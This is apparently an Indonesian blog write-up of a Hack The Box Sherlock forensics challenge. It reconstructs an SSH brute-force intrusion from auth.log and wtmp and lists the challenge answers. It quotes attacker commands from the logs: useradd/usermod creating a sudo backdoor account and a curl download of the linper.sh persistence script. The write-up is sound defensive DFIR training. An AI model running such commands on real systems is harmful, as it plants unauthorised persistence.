---
title: "Brutus — HTB Sherlock: Linux Log Forensics"
date: 2024-03-06 06:32:45 +0700
description: Analisis forensik log Linux pada kasus brute force SSH — mencakup identifikasi attacker, timeline rekonstruksi, persistence analysis, dan MITRE ATT&CK mapping.
image:
  path: "https://cdn.jsdelivr.net/gh/firmansyahdzakwanarifien/firmansyahdzakwanarifien-assets@main/blog/img/projects/task/hackthebox/brutus/cover.png"
  alt: "Brutus HTB Sherlock Writeup"
categories:
  - Hack The Box
  - Sherlock
tags:
  - forensics
  - log-analysis
  - ssh
  - brute-force
  - dfir
  - mitre-attck
  - linux
  - very-easy
platform: Hack The Box – Sherlock
difficulty: Very Easy
challenge_author: CyberJunkie
status: completed
artifacts:
  - auth.log
  - wtmp
  - utmp.py
---

## 🔍 Challenge Overview

**Brutus** adalah challenge forensik yang mengangkat skenario umum di dunia nyata: sebuah server Linux mengalami **brute force attack** via SSH. Setelah berhasil masuk, attacker melakukan serangkaian aktivitas lanjutan yang dapat direkonstruksi melalui analisis log.

### Skill yang Dilatih

- Unix Log Analysis
- SSH Brute Force Detection
- Timeline Reconstruction
- Persistence Analysis
- MITRE ATT&CK Mapping

---

## 🗂️ Artifact Overview


![Articact](https://cdn.jsdelivr.net/gh/firmansyahdzakwanarifien/firmansyahdzakwanarifien-assets@main/blog/img/projects/task/hackthebox/brutus/artifact.png)
_Pola Failed password berulang dari IP yang sama_

| Artefak | Tipe | Fungsi |
|---------|------|--------|
| `auth.log` | Text | Riwayat autentikasi sistem (SSH, sudo, user management) |
| `wtmp` | Binary | Riwayat sesi login/logout terminal |
| `utmp.py` | Script | Helper untuk membaca `wtmp` lintas arsitektur |

### `auth.log`

File teks yang mencatat **seluruh aktivitas autentikasi** pada sistem Linux:

- SSH login attempts (berhasil maupun gagal)
- Penggunaan `sudo`
- Pembuatan user baru & privilege escalation

Struktur umum satu baris log:

```
[Timestamp]  [Hostname]  [Service/PID]  [Status]  [Username]  [IP]  [Detail]
```

Contoh entri brute force:

```
Mar 06 06:31:33 server sshd[2394]: Failed password for root from 65.2.161.68 port 34782 ssh2
```

### `wtmp`

File **binary** berisi riwayat sesi login/logout. Tidak bisa dibaca langsung — gunakan:

```bash
# Native Linux
last -f wtmp

# Helper script (challenge)
python3 utmp.py -o wtmp.out wtmp
```

> **Catatan penting:** *Authentication time* ≠ *Session start time*. Inilah mengapa `wtmp` krusial untuk validasi timeline.
{: .prompt-warning }

---

## 🔎 Investigation & Findings

### Task 1 — Attacker IP Address

![Task 1.1](https://cdn.jsdelivr.net/gh/firmansyahdzakwanarifien/firmansyahdzakwanarifien-assets@main/blog/img/projects/task/hackthebox/brutus/task1.1.png)

Brute force dapat diidentifikasi dari pola berikut di `auth.log`:

- Entri `Failed password` dalam jumlah sangat banyak
- Dari **IP yang sama**
- Dalam jeda waktu sangat singkat (tidak mungkin manual)

```
Mar 06 06:31:31 server sshd[2394]: Failed password for root from 65.2.161.68 port 34782 ssh2
Mar 06 06:31:33 server sshd[2394]: Failed password for root from 65.2.161.68 port 34782 ssh2
Mar 06 06:31:35 server sshd[2394]: Failed password for root from 65.2.161.68 port 34782 ssh2
```

> **Answer:** `65.2.161.68`
{: .prompt-tip }

![Task 1.2](https://cdn.jsdelivr.net/gh/firmansyahdzakwanarifien/firmansyahdzakwanarifien-assets@main/blog/img/projects/task/hackthebox/brutus/task1.2.png)

---

### Task 2 — Compromised Account

Indikator keberhasilan brute force adalah adanya log:

```
Accepted password for root from 65.2.161.68
```

Attacker berhasil login sebagai user dengan **privilege tertinggi**.

![Screenshot accepted password task 2](https://cdn.jsdelivr.net/gh/firmansyahdzakwanarifien/firmansyahdzakwanarifien-assets@main/blog/img/projects/task/hackthebox/brutus/task2.png)
_Entri "Accepted password" menandakan brute force berhasil_

> **Answer:** `root`
{: .prompt-tip }

---

### Task 3 — Interactive Login Timestamp (UTC)

Analisis `wtmp` diperlukan untuk membedakan waktu autentikasi dan waktu sesi terminal aktif secara nyata.

![Screenshot wtmp session timestamp task 3](https://cdn.jsdelivr.net/gh/firmansyahdzakwanarifien/firmansyahdzakwanarifien-assets@main/blog/img/projects/task/hackthebox/brutus/task3.png)
_Waktu sesi interaktif dari hasil parse wtmp_

> **Answer:** `2024-03-06 06:32:45 UTC`
{: .prompt-tip }

---

### Task 4 — SSH Session Number

Setiap koneksi SSH mendapatkan session ID unik yang tercatat di `auth.log`. Session ID digunakan untuk melacak kapan sesi dimulai dan berakhir.

![Screenshot session ID task 4](https://cdn.jsdelivr.net/gh/firmansyahdzakwanarifien/firmansyahdzakwanarifien-assets@main/blog/img/projects/task/hackthebox/brutus/task4.png)
_Session ID 37 pada entri login root_

> **Answer:** `37`
{: .prompt-tip }

---

### Task 5 — Persistence Account

Setelah mendapatkan akses root, attacker membuat user baru sebagai **backdoor persistence**:

```bash
useradd cyberjunkie
usermod -aG sudo cyberjunkie
```

![Screenshot useradd log task 5](https://cdn.jsdelivr.net/gh/firmansyahdzakwanarifien/firmansyahdzakwanarifien-assets@main/blog/img/projects/task/hackthebox/brutus/task5.png)
_Log pembuatan user dan penambahan ke grup sudo_

> **Answer:** `cyberjunkie`
{: .prompt-tip }

---

### Task 6 — MITRE ATT&CK Mapping

Pembuatan akun lokal untuk persistence diklasifikasikan sebagai:

| Field | Value |
|-------|-------|
| Tactic | Persistence |
| Technique | Create Account (`T1136`) |
| Sub-technique | Local Account |

![Screenshot MITRE mapping task 6](https://cdn.jsdelivr.net/gh/firmansyahdzakwanarifien/firmansyahdzakwanarifien-assets@main/blog/img/projects/task/hackthebox/brutus/task6.png)
_T1136.001 pada MITRE ATT&CK Enterprise Matrix_

> **Answer:** `T1136.001`
{: .prompt-tip }

---

### Task 7 — End of First SSH Session

Session ID 37 ditutup berdasarkan log `auth.log` pada:

![Screenshot session end task 7](https://cdn.jsdelivr.net/gh/firmansyahdzakwanarifien/firmansyahdzakwanarifien-assets@main/blog/img/projects/task/hackthebox/brutus/task7.png)
_Entri penutupan sesi SSH ID 37_

> **Answer:** `2024-03-06 06:37:24`
{: .prompt-tip }

Durasi sesi pertama: ±**4 menit 39 detik** — singkat, konsisten dengan aktivitas otomatisasi.

---

### Task 8 — Post Exploitation Activity

Attacker login kembali menggunakan akun `cyberjunkie`, lalu mengeksekusi perintah via `sudo`:

```bash
/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

Script eksternal dari GitHub ini kemungkinan digunakan untuk privilege enumeration, persistence reinforcement, dan lateral movement preparation.

![Screenshot sudo curl command task 8](https://cdn.jsdelivr.net/gh/firmansyahdzakwanarifien/firmansyahdzakwanarifien-assets@main/blog/img/projects/task/hackthebox/brutus/task8.png)
_Perintah curl via sudo tercatat di auth.log_

> **Answer:** `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`
{: .prompt-tip }

---

## ✅ Kesimpulan

Challenge **Brutus** membuktikan bahwa investigasi forensik yang efektif tidak selalu membutuhkan tool canggih. Hanya dari dua artefak sederhana — `auth.log` dan `wtmp` — kita mampu merekonstruksi **seluruh rantai serangan** dari awal hingga akhir.

1. **Sumber serangan** — IP `65.2.161.68` sebagai pelaku brute force
2. **Akun yang dikompromikan** — `root`, privilege tertinggi sistem
3. **Timeline insiden** — dari detik pertama brute force hingga eksekusi script berbahaya
4. **Mekanisme persistence** — pembuatan user `cyberjunkie` dengan akses sudo penuh
5. **Klasifikasi ATT&CK** — `T1136.001` (Local Account Creation)
6. **Post-exploitation** — pengunduhan `linper.sh` via curl

Meskipun dikategorikan *Very Easy*, skenario ini sangat representatif terhadap serangan nyata di server produksi. Brute force SSH sederhana, jika berhasil, dapat berujung pada kompromi sistem secara penuh.

> *Seringkali, sebuah insiden besar dimulai dari satu hal yang sederhana — sebuah password yang berhasil ditebak.*
{: .prompt-info }

---